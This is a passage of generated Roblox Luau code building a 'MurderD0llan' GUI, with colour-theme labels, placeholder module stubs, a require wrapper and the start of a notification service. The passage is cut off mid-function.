G2L["1ca"]:SetAttribute([[COLOR_CLOSE_HOVER]], Color3.fromRGB(233, 18, 36));
G2L["1ca"]:SetAttribute([[COLOR_BACKGROUND_DARK]], Color3.fromRGB(31, 31, 31));
G2L["1ca"]:SetAttribute([[COLOR_BACKGROUND_MEDIUM]], Color3.fromRGB(46, 46, 46));
G2L["1ca"]:SetAttribute([[COLOR_TEXT_LIGHT]], Color3.fromRGB(241, 241, 241));
G2L["1ca"]:SetAttribute([[EVERY_BUTTON_COLOR_GRADIENT]], ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))});
G2L["1ca"]:SetAttribute([[COLOR_CLOSE_DEFAULT]], Color3.fromRGB(0, 121, 216));

-- StarterGui.MurderD0llan.Themes.Inferno
G2L["1cb"] = Instance.new("TextLabel", G2L["1c9"]);
G2L["1cb"]["BorderSizePixel"] = 0;
G2L["1cb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1cb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1cb"]["TextSize"] = 14;
G2L["1cb"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cb"]["Name"] = [[Inferno]];
G2L["1cb"]["Visible"] = false;
-- Attributes
G2L["1cb"]:SetAttribute([[COLOR_ACCENT_BLUE]], Color3.fromRGB(255, 81, 0));
G2L["1cb"]:SetAttribute([[COLOR_BORDER]], Color3.fromRGB(121, 41, 31));
G2L["1cb"]:SetAttribute([[COLOR_CLOSE_HOVER]], Color3.fromRGB(255, 0, 0));
G2L["1cb"]:SetAttribute([[COLOR_BACKGROUND_DARK]], Color3.fromRGB(51, 0, 0));
G2L["1cb"]:SetAttribute([[COLOR_BACKGROUND_MEDIUM]], Color3.fromRGB(81, 21, 21));
G2L["1cb"]:SetAttribute([[COLOR_TEXT_LIGHT]], Color3.fromRGB(255, 201, 181));
G2L["1cb"]:SetAttribute([[EVERY_BUTTON_COLOR_GRADIENT]], ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(185, 158, 24)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 101, 0))});
G2L["1cb"]:SetAttribute([[COLOR_CLOSE_DEFAULT]], Color3.fromRGB(0, 121, 216));

-- StarterGui.MurderD0llan.Themes.LightSoft
G2L["1cc"] = Instance.new("TextLabel", G2L["1c9"]);
G2L["1cc"]["BorderSizePixel"] = 0;
G2L["1cc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1cc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1cc"]["TextSize"] = 14;
G2L["1cc"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cc"]["Name"] = [[LightSoft]];
G2L["1cc"]["Visible"] = false;
-- Attributes
G2L["1cc"]:SetAttribute([[COLOR_ACCENT_BLUE]], Color3.fromRGB(0, 121, 216));
G2L["1cc"]:SetAttribute([[COLOR_BORDER]], Color3.fromRGB(201, 201, 201));
G2L["1cc"]:SetAttribute([[COLOR_CLOSE_HOVER]], Color3.fromRGB(233, 18, 36));
G2L["1cc"]:SetAttribute([[COLOR_BACKGROUND_DARK]], Color3.fromRGB(221, 221, 221));
G2L["1cc"]:SetAttribute([[COLOR_BACKGROUND_MEDIUM]], Color3.fromRGB(241, 241, 241));
G2L["1cc"]:SetAttribute([[COLOR_TEXT_LIGHT]], Color3.fromRGB(31, 31, 31));
G2L["1cc"]:SetAttribute([[EVERY_BUTTON_COLOR_GRADIENT]], ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(241, 241, 241)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 121, 216))});
G2L["1cc"]:SetAttribute([[COLOR_CLOSE_DEFAULT]], Color3.fromRGB(0, 121, 216));

-- StarterGui.MurderD0llan.Themes.Midnight
G2L["1cd"] = Instance.new("TextLabel", G2L["1c9"]);
G2L["1cd"]["BorderSizePixel"] = 0;
G2L["1cd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1cd"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1cd"]["TextSize"] = 14;
G2L["1cd"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cd"]["Name"] = [[Midnight]];
G2L["1cd"]["Visible"] = false;
-- Attributes
G2L["1cd"]:SetAttribute([[COLOR_ACCENT_BLUE]], Color3.fromRGB(0, 151, 255));
G2L["1cd"]:SetAttribute([[COLOR_BORDER]], Color3.fromRGB(31, 31, 51));
G2L["1cd"]:SetAttribute([[COLOR_CLOSE_HOVER]], Color3.fromRGB(255, 31, 61));
G2L["1cd"]:SetAttribute([[COLOR_BACKGROUND_DARK]], Color3.fromRGB(11, 11, 21));
G2L["1cd"]:SetAttribute([[COLOR_BACKGROUND_MEDIUM]], Color3.fromRGB(21, 21, 41));
G2L["1cd"]:SetAttribute([[COLOR_TEXT_LIGHT]], Color3.fromRGB(201, 201, 255));
G2L["1cd"]:SetAttribute([[EVERY_BUTTON_COLOR_GRADIENT]], ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(44, 44, 130)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 151, 255))});
G2L["1cd"]:SetAttribute([[COLOR_CLOSE_DEFAULT]], Color3.fromRGB(0, 121, 216));

-- StarterGui.MurderD0llan.Themes.ForestGreen
G2L["1ce"] = Instance.new("TextLabel", G2L["1c9"]);
G2L["1ce"]["BorderSizePixel"] = 0;
G2L["1ce"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ce"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ce"]["TextSize"] = 14;
G2L["1ce"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ce"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ce"]["Name"] = [[ForestGreen]];
G2L["1ce"]["Visible"] = false;
-- Attributes
G2L["1ce"]:SetAttribute([[COLOR_ACCENT_BLUE]], Color3.fromRGB(81, 201, 121));
G2L["1ce"]:SetAttribute([[COLOR_BORDER]], Color3.fromRGB(51, 101, 61));
G2L["1ce"]:SetAttribute([[COLOR_CLOSE_HOVER]], Color3.fromRGB(201, 51, 51));
G2L["1ce"]:SetAttribute([[COLOR_BACKGROUND_DARK]], Color3.fromRGB(16, 31, 16));
G2L["1ce"]:SetAttribute([[COLOR_BACKGROUND_MEDIUM]], Color3.fromRGB(31, 61, 31));
G2L["1ce"]:SetAttribute([[COLOR_TEXT_LIGHT]], Color3.fromRGB(211, 255, 221));
G2L["1ce"]:SetAttribute([[EVERY_BUTTON_COLOR_GRADIENT]], ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(40, 146, 134)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(81, 201, 121))});
G2L["1ce"]:SetAttribute([[COLOR_CLOSE_DEFAULT]], Color3.fromRGB(0, 121, 216));

-- StarterGui.MurderD0llan.Themes.Terminal
G2L["1cf"] = Instance.new("TextLabel", G2L["1c9"]);
G2L["1cf"]["BorderSizePixel"] = 0;
G2L["1cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1cf"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1cf"]["TextSize"] = 14;
G2L["1cf"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cf"]["Name"] = [[Terminal]];
G2L["1cf"]["Visible"] = false;
-- Attributes
G2L["1cf"]:SetAttribute([[COLOR_ACCENT_BLUE]], Color3.fromRGB(0, 255, 0));
G2L["1cf"]:SetAttribute([[COLOR_BORDER]], Color3.fromRGB(31, 255, 31));
G2L["1cf"]:SetAttribute([[COLOR_CLOSE_HOVER]], Color3.fromRGB(255, 0, 0));
G2L["1cf"]:SetAttribute([[COLOR_BACKGROUND_DARK]], Color3.fromRGB(0, 0, 0));
G2L["1cf"]:SetAttribute([[COLOR_BACKGROUND_MEDIUM]], Color3.fromRGB(16, 16, 16));
G2L["1cf"]:SetAttribute([[COLOR_TEXT_LIGHT]], Color3.fromRGB(0, 255, 0));
G2L["1cf"]:SetAttribute([[EVERY_BUTTON_COLOR_GRADIENT]], ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 181, 0))});
G2L["1cf"]:SetAttribute([[COLOR_CLOSE_DEFAULT]], Color3.fromRGB(0, 121, 216));

-- StarterGui.MurderD0llan.Themes.MonoChrome
G2L["1d0"] = Instance.new("TextLabel", G2L["1c9"]);
G2L["1d0"]["BorderSizePixel"] = 0;
G2L["1d0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d0"]["TextSize"] = 14;
G2L["1d0"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d0"]["Name"] = [[MonoChrome]];
G2L["1d0"]["Visible"] = false;
-- Attributes
G2L["1d0"]:SetAttribute([[COLOR_ACCENT_BLUE]], Color3.fromRGB(201, 201, 201));
G2L["1d0"]:SetAttribute([[COLOR_BORDER]], Color3.fromRGB(101, 101, 101));
G2L["1d0"]:SetAttribute([[COLOR_CLOSE_HOVER]], Color3.fromRGB(255, 51, 51));
G2L["1d0"]:SetAttribute([[COLOR_BACKGROUND_DARK]], Color3.fromRGB(41, 41, 41));
G2L["1d0"]:SetAttribute([[COLOR_BACKGROUND_MEDIUM]], Color3.fromRGB(61, 61, 61));
G2L["1d0"]:SetAttribute([[COLOR_TEXT_LIGHT]], Color3.fromRGB(255, 255, 255));
G2L["1d0"]:SetAttribute([[EVERY_BUTTON_COLOR_GRADIENT]], ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(41, 41, 41)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))});
G2L["1d0"]:SetAttribute([[COLOR_CLOSE_DEFAULT]], Color3.fromRGB(0, 121, 216));

-- StarterGui.MurderD0llan.Themes.SolarizedLight
G2L["1d1"] = Instance.new("TextLabel", G2L["1c9"]);
G2L["1d1"]["BorderSizePixel"] = 0;
G2L["1d1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d1"]["TextSize"] = 14;
G2L["1d1"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d1"]["Name"] = [[SolarizedLight]];
G2L["1d1"]["Visible"] = false;
-- Attributes
G2L["1d1"]:SetAttribute([[COLOR_ACCENT_BLUE]], Color3.fromRGB(39, 140, 211));
G2L["1d1"]:SetAttribute([[COLOR_BORDER]], Color3.fromRGB(148, 162, 162));
G2L["1d1"]:SetAttribute([[COLOR_CLOSE_HOVER]], Color3.fromRGB(221, 51, 48));
G2L["1d1"]:SetAttribute([[COLOR_BACKGROUND_DARK]], Color3.fromRGB(254, 247, 228));
G2L["1d1"]:SetAttribute([[COLOR_BACKGROUND_MEDIUM]], Color3.fromRGB(239, 233, 214));
G2L["1d1"]:SetAttribute([[COLOR_TEXT_LIGHT]], Color3.fromRGB(102, 124, 132));
G2L["1d1"]:SetAttribute([[EVERY_BUTTON_COLOR_GRADIENT]], ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(39, 140, 211)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(211, 211, 211))});
G2L["1d1"]:SetAttribute([[COLOR_CLOSE_DEFAULT]], Color3.fromRGB(0, 121, 216));

-- StarterGui.MurderD0llan.Themes.IcyBlue
G2L["1d2"] = Instance.new("TextLabel", G2L["1c9"]);
G2L["1d2"]["BorderSizePixel"] = 0;
G2L["1d2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d2"]["TextSize"] = 14;
G2L["1d2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d2"]["Name"] = [[IcyBlue]];
G2L["1d2"]["Visible"] = false;
-- Attributes
G2L["1d2"]:SetAttribute([[COLOR_ACCENT_BLUE]], Color3.fromRGB(0, 181, 255));
G2L["1d2"]:SetAttribute([[COLOR_BORDER]], Color3.fromRGB(81, 121, 151));
G2L["1d2"]:SetAttribute([[COLOR_CLOSE_HOVER]], Color3.fromRGB(255, 61, 81));
G2L["1d2"]:SetAttribute([[COLOR_BACKGROUND_DARK]], Color3.fromRGB(21, 41, 61));
G2L["1d2"]:SetAttribute([[COLOR_BACKGROUND_MEDIUM]], Color3.fromRGB(41, 61, 81));
G2L["1d2"]:SetAttribute([[COLOR_TEXT_LIGHT]], Color3.fromRGB(221, 241, 255));
G2L["1d2"]:SetAttribute([[EVERY_BUTTON_COLOR_GRADIENT]], ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(21, 51, 150)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 181, 255))});
G2L["1d2"]:SetAttribute([[COLOR_CLOSE_DEFAULT]], Color3.fromRGB(0, 121, 216));

-- StarterGui.MurderD0llan.Themes.NeonViolet
G2L["1d3"] = Instance.new("TextLabel", G2L["1c9"]);
G2L["1d3"]["BorderSizePixel"] = 0;
G2L["1d3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d3"]["TextSize"] = 14;
G2L["1d3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d3"]["Name"] = [[NeonViolet]];
G2L["1d3"]["Visible"] = false;
-- Attributes
G2L["1d3"]:SetAttribute([[COLOR_ACCENT_BLUE]], Color3.fromRGB(181, 0, 255));
G2L["1d3"]:SetAttribute([[COLOR_BORDER]], Color3.fromRGB(91, 31, 111));
G2L["1d3"]:SetAttribute([[COLOR_CLOSE_HOVER]], Color3.fromRGB(255, 61, 101));
G2L["1d3"]:SetAttribute([[COLOR_BACKGROUND_DARK]], Color3.fromRGB(26, 0, 36));
G2L["1d3"]:SetAttribute([[COLOR_BACKGROUND_MEDIUM]], Color3.fromRGB(51, 11, 71));
G2L["1d3"]:SetAttribute([[COLOR_TEXT_LIGHT]], Color3.fromRGB(255, 221, 255));
G2L["1d3"]:SetAttribute([[EVERY_BUTTON_COLOR_GRADIENT]], ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(70, 0, 100)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(181, 0, 255))});
G2L["1d3"]:SetAttribute([[COLOR_CLOSE_DEFAULT]], Color3.fromRGB(0, 121, 216));

-- StarterGui.MurderD0llan.WindowsUIScript
G2L["1d4"] = Instance.new("LocalScript", G2L["1"]);
G2L["1d4"]["Name"] = [[WindowsUIScript]];
-- Attributes
G2L["1d4"]:SetAttribute([[TestingPage]], true);

-- StarterGui.MurderD0llan.NotificationService
G2L["1d5"] = Instance.new("ModuleScript", G2L["1"]);
G2L["1d5"]["Name"] = [[NotificationService]];
-- Attributes
G2L["1d5"]:SetAttribute([[MAX_VISIBLE_NOTIFICATIONS]], 5);
G2L["1d5"]:SetAttribute([[DEFAULT_FADE_TIME]], 0.3);
G2L["1d5"]:SetAttribute([[DEFAULT_NOTIFICATION_DURATION]], 5);

-- StarterGui.MurderD0llan.NotificationService.NotificationGuiTemplate
G2L["1d6"] = Instance.new("ScreenGui", G2L["1d5"]);
G2L["1d6"]["Enabled"] = false;
G2L["1d6"]["Name"] = [[NotificationGuiTemplate]];
G2L["1d6"]["ResetOnSpawn"] = false;

-- StarterGui.MurderD0llan.NotificationService.NotificationGuiTemplate.NotificationFrameTemplate
G2L["1d7"] = Instance.new("Frame", G2L["1d6"]);
G2L["1d7"]["BorderSizePixel"] = 0;
G2L["1d7"]["BackgroundColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1d7"]["AnchorPoint"] = Vector2.new(0.5, 0);
G2L["1d7"]["Size"] = UDim2.new(1, 0, 0, 0);
G2L["1d7"]["AutomaticSize"] = Enum.AutomaticSize.Y;
G2L["1d7"]["Name"] = [[NotificationFrameTemplate]];

-- StarterGui.MurderD0llan.NotificationService.NotificationGuiTemplate.NotificationFrameTemplate.UICorner
G2L["1d8"] = Instance.new("UICorner", G2L["1d7"]);


-- StarterGui.MurderD0llan.NotificationService.NotificationGuiTemplate.NotificationFrameTemplate.UIPadding
G2L["1d9"] = Instance.new("UIPadding", G2L["1d7"]);
G2L["1d9"]["PaddingTop"] = UDim.new(0, 10);
G2L["1d9"]["PaddingRight"] = UDim.new(0, 10);
G2L["1d9"]["PaddingBottom"] = UDim.new(0, 10);
G2L["1d9"]["PaddingLeft"] = UDim.new(0, 10);

-- StarterGui.MurderD0llan.NotificationService.NotificationGuiTemplate.NotificationFrameTemplate.ContentLayout
G2L["1da"] = Instance.new("UIListLayout", G2L["1d7"]);
G2L["1da"]["Name"] = [[ContentLayout]];
G2L["1da"]["Padding"] = UDim.new(0, 5);
G2L["1da"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.MurderD0llan.NotificationService.NotificationGuiTemplate.NotificationFrameTemplate.TitleLabel
G2L["1db"] = Instance.new("TextLabel", G2L["1d7"]);
G2L["1db"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1db"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1db"]["TextSize"] = 16;
G2L["1db"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1db"]["LayoutOrder"] = 1;
G2L["1db"]["Size"] = UDim2.new(1, -25, 0, 20);
G2L["1db"]["Text"] = [[Notification Title]];
G2L["1db"]["Name"] = [[TitleLabel]];
G2L["1db"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderD0llan.NotificationService.NotificationGuiTemplate.NotificationFrameTemplate.TextLabel
G2L["1dc"] = Instance.new("TextLabel", G2L["1d7"]);
G2L["1dc"]["TextWrapped"] = true;
G2L["1dc"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["1dc"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1dc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1dc"]["TextSize"] = 14;
G2L["1dc"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["1dc"]["LayoutOrder"] = 2;
G2L["1dc"]["AutomaticSize"] = Enum.AutomaticSize.Y;
G2L["1dc"]["Size"] = UDim2.new(1, 0, 0, 0);
G2L["1dc"]["Text"] = [[This is the notification message content. It can be a bit longer to demonstrate wrapping.]];
G2L["1dc"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderD0llan.NotificationService.NotificationGuiTemplate.NotificationFrameTemplate.CloseButton
G2L["1dd"] = Instance.new("TextButton", G2L["1d7"]);
G2L["1dd"]["ZIndex"] = 2;
G2L["1dd"]["TextSize"] = 16;
G2L["1dd"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1dd"]["TextColor3"] = Color3.fromRGB(201, 201, 201);
G2L["1dd"]["AnchorPoint"] = Vector2.new(1, 0);
G2L["1dd"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["1dd"]["Name"] = [[CloseButton]];
G2L["1dd"]["Text"] = [[X]];
G2L["1dd"]["Position"] = UDim2.new(1, -5, 0, 5);
G2L["1dd"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderD0llan.HelpModules
G2L["1de"] = Instance.new("Frame", G2L["1"]);
G2L["1de"]["BorderSizePixel"] = 0;
G2L["1de"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1de"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1de"]["Visible"] = false;
G2L["1de"]["Name"] = [[HelpModules]];

-- StarterGui.MurderD0llan.HelpModules.DodgeModule
G2L["1df"] = Instance.new("ModuleScript", G2L["1de"]);
G2L["1df"]["Name"] = [[DodgeModule]];

-- StarterGui.MurderD0llan.HelpModules.SafeZone
G2L["1e0"] = Instance.new("ModuleScript", G2L["1de"]);
G2L["1e0"]["Name"] = [[SafeZone]];

-- StarterGui.MurderD0llan.HelpModules.MurderD0llanAdminModule
G2L["1e1"] = Instance.new("ModuleScript", G2L["1de"]);
G2L["1e1"]["Name"] = [[MurderD0llanAdminModule]];

-- StarterGui.MurderD0llan.HelpModules.KeyBindBTNModule
G2L["1e2"] = Instance.new("ModuleScript", G2L["1de"]);
G2L["1e2"]["Name"] = [[KeyBindBTNModule]];

-- StarterGui.MurderD0llan.HelpModules.TranslatorModule
G2L["1e3"] = Instance.new("ModuleScript", G2L["1de"]);
G2L["1e3"]["Name"] = [[TranslatorModule]];

-- StarterGui.MurderD0llan.HelpModules.ButtonSelectorModule
G2L["1e4"] = Instance.new("ModuleScript", G2L["1de"]);
G2L["1e4"]["Name"] = [[ButtonSelectorModule]];

-- StarterGui.MurderD0llan.HelpModules.KeySelectorModule
G2L["1e5"] = Instance.new("ModuleScript", G2L["1de"]);
G2L["1e5"]["Name"] = [[KeySelectorModule]];

-- Require G2L wrapper
local G2L_REQUIRE = require;
local G2L_MODULES = {};
local function require(Module:ModuleScript)
	local ModuleState = G2L_MODULES[Module];
	if ModuleState then
		if not ModuleState.Required then
			ModuleState.Required = true;
			ModuleState.Value = ModuleState.Closure();
		end
		return ModuleState.Value;
	end;
	return G2L_REQUIRE(Module);
end

G2L_MODULES[G2L["16e"]] = {
	Closure = function()
		local script = G2L["16e"];
		local ApplyInformation = {}

		local InfoFrame = script.Parent
		local InformationLabel = InfoFrame:FindFirstChild("Information")
		local ViewPortFrame = InfoFrame:FindFirstChild("ViewPortFrame")
		-- Plantilla de formato por defecto
		local DefaultTemplate = "  %s in page %d - %s"

		local SIMPLIFIED_TYPEOF_TEXTS = {
			["button"] = "Button",
			["toggle"] = "Toggle",
			["button_with_box"] = "Button With Box",
			["button_changer"] = "Button Changer"
		}

		function ApplyInformation.Apply(DebugName: string?, InWhatPage: number, TypeOf: string?, instance: Instance)
			if not instance or not instance:IsA("GuiObject") then return end

			TypeOf = TypeOf and TypeOf ~= "" and TypeOf or nil

			-- Si no se especificó TypeOf, detectarlo automáticamente
			if not TypeOf then
				if instance:FindFirstChildOfClass("Frame") then
					TypeOf = "toggle"
				elseif instance:FindFirstChildOfClass("TextBox") then
					TypeOf = "button_with_box"
				elseif instance:FindFirstChildOfClass("TextButton") and instance:FindFirstChildOfClass("TextButton").Text:lower() == "change" then
					TypeOf = "button_changer"
				else
					TypeOf = "button"
				end
			end

			local readableType = SIMPLIFIED_TYPEOF_TEXTS[TypeOf] or "Unknown"

			-- Actualizar texto
			if InformationLabel then
				InformationLabel.Text = DefaultTemplate:format(DebugName, InWhatPage, readableType)
			end

			-- Limpiar viewport y mostrar clon
			if ViewPortFrame then
				local clone = instance:Clone()
				clone.Parent = ViewPortFrame
			end
		end

		return ApplyInformation

	end;
};
G2L_MODULES[G2L["1d5"]] = {
	Closure = function()
		local script = G2L["1d5"];
		--this service was made by Roblox AI Assistant - PROMPT: G0bbyD0llan

		local NotificationService = {}

		-- Services
		local TweenService = game:GetService("TweenService")
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local UserInputService = game:GetService("UserInputService") -- For potential future use (e.g., mouse hover effects)

		-- Configuration Constants

		local GUI_TEMPLATE_NAME = "NotificationGuiTemplate"
		local NOTIFICATION_FRAME_TEMPLATE_NAME = "NotificationFrameTemplate"
		local NOTIFICATION_CONTAINER_NAME = "NotificationContainer"
		local NOTIFICATION_SCREEN_GUI_NAME = "NotificationDisplayScreenGui"

		local DEFAULT_FADE_TIME = script:GetAttribute("DEFAULT_FADE_TIME")
		local DEFAULT_NOTIFICATION_DURATION = script:GetAttribute("DEFAULT_NOTIFICATION_DURATION") -- seconds, 0 or nil for no auto-close
		local MAX_VISIBLE_NOTIFICATIONS = script:GetAttribute("MAX_VISIBLE_NOTIFICATIONS")
		local NOTIFICATION_SPACING_PIXELS = 10
		local NOTIFICATION_WIDTH_SCALE = 0.25
		local NOTIFICATION_MAX_HEIGHT_SCALE = 0.8
		local NOTIFICATIONS_ENABLED = true
		local function UpdateNumbersWithAttributes()
			MAX_VISIBLE_NOTIFICATIONS = script:GetAttribute("MAX_VISIBLE_NOTIFICATIONS")
			DEFAULT_FADE_TIME = script:GetAttribute("DEFAULT_FADE_TIME")
			DEFAULT_NOTIFICATION_DURATION = script:GetAttribute("DEFAULT_NOTIFICATION_DURATION")
		end
		-- Themes: Define your themes here
		local themes = {
			Default = {
				BackgroundColor3 = Color3.fromRGB(45, 45, 45),
				TitleColor = Color3.fromRGB(255, 255, 255),
				TextColor = Color3.fromRGB(220, 220, 220),
				CloseButtonColor = Color3.fromRGB(70, 70, 70), -- Example
				CloseButtonIconColor = Color3.fromRGB(200,200,200) -- Example for 'X'
			},
			Light = {
				BackgroundColor3 = Color3.fromRGB(230, 230, 230),
				TitleColor = Color3.fromRGB(0, 0, 0),
				TextColor = Color3.fromRGB(50, 50, 50),
				CloseButtonColor = Color3.fromRGB(200, 200, 200),
				CloseButtonIconColor = Color3.fromRGB(50,50,50)
			},
			Success = {
				BackgroundColor3 = Color3.fromRGB(76, 175, 80), -- Green
				TitleColor = Color3.fromRGB(255, 255, 255),
				TextColor = Color3.fromRGB(230, 230, 230),
				CloseButtonColor = Color3.fromRGB(56, 142, 60),
				CloseButtonIconColor = Color3.fromRGB(255,255,255)
			},
			Warning = {
				BackgroundColor3 = Color3.fromRGB(255, 152, 0), -- Orange
				TitleColor = Color3.fromRGB(255, 255, 255),
				TextColor = Color3.fromRGB(240, 240, 240),
				CloseButtonColor = Color3.fromRGB(245, 124, 0),
				CloseButtonIconColor = Color3.fromRGB(255,255,255)
			},
			Error = {
				BackgroundColor3 = Color3.fromRGB(244, 67, 54), -- Red
				TitleColor = Color3.fromRGB(255, 255, 255),
				TextColor = Color3.fromRGB(235, 235, 235),
				CloseButtonColor = Color3.fromRGB(211, 47, 47),
				CloseButtonIconColor = Color3.fromRGB(255,255,255)
			}
		}

		-- State (client-only)
		local masterNotificationFrameTemplate
		local notificationScreenGui
		local notificationContainerFrame
		local notificationStackLayout -- Store the UIListLayout

		local activeNotificationData = {} -- Stores {guiInstance, options, durationTimer, closeConn}
		local notificationQueue = {} -- Stores notification options objects
		local layoutOrderCounter = 0
		local isPaused = false
		local defaultThemeName = "Default"
		local currentScreenCorner = "BottomRight" -- "BottomRight", "BottomLeft", "TopRight", "TopLeft"
		local onNotificationClosedCallbacks = {}

		local soundIdOpen = nil -- Example: "rbxassetid://YOUR_SOUND_ID"
		local soundIdClose = nil -- Example: "rbxassetid://YOUR_SOUND_ID"

		-- Forward declaration for internal use
		local internalCloseNotification
		local processNotificationQueue

		-- Helper to play sounds
		local function playSound(soundId, parent)
			if not soundId or soundId == "" then return end
			local sound = Instance.new("Sound")
			sound.SoundId = soundId
			sound.Parent = parent or notificationContainerFrame -- Parent to container or specific notification
			sound:Play()
			sound.Ended:Connect(function()
				sound:Destroy()
			end)
		end

		-- Helper function to apply theme and colors
		local function applyThemeAndColors(notificationFrame, options)
			local themeToApply = themes[options.theme or defaultThemeName] or themes.Default

			notificationFrame.BackgroundColor3 = options.color or themeToApply.BackgroundColor3

			local titleLabel = notificationFrame:FindFirstChild("TitleLabel")
			if titleLabel and titleLabel:IsA("TextLabel") then
				titleLabel.TextColor3 = themeToApply.TitleColor
			end

			local textLabel = notificationFrame:FindFirstChild("TextLabel")
			if textLabel and textLabel:IsA("TextLabel") then
				textLabel.TextColor3 = themeToApply.TextColor
			end

			local closeButton = notificationFrame:FindFirstChild("CloseButton")
			if closeButton then
				if themeToApply.CloseButtonColor then closeButton.BackgroundColor3 = themeToApply.CloseButtonColor end
				if closeButton:IsA("TextButton") and themeToApply.CloseButtonIconColor then closeButton.TextColor3 = themeToApply.CloseButtonIconColor end
				-- Add ImageColor3 for ImageButton if using icons in themes
			end
		end


		local function getOrCreateClientGui()
			if not RunService:IsClient() then return end
			local player = Players.LocalPlayer
			if not player then return end
			local playerGui = player:WaitForChild("PlayerGui")

